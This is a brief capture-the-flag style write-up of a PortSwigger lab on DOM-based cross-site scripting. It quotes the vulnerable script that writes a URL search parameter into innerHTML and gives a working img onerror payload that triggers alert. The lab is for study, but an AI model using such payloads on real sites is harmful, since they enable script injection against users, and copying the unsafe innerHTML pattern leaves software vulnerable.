# [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

## Lab

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Analysis

review source code:

- interesing js block:

  ```js
  <script>
      function doSearchQuery(query) {
          document.getElementById('searchMessage').innerHTML = query;
      }
      var query = (new URLSearchParams(window.location.search)).get('search');
      if(query) {
          doSearchQuery(query);
      }
  </script>
  ```

  - query is a variable controlled by user

## Solutions

first try: `<script>alert(1)</script>`

fail:

```html
<span id="searchMessage"><script>alert(1)</script></span>
```

solution: `<img src=1 onerror="alert(1)">`

success:

```html
<span id="searchMessage"><img src="1" onerror="alert(1)"></span>
```
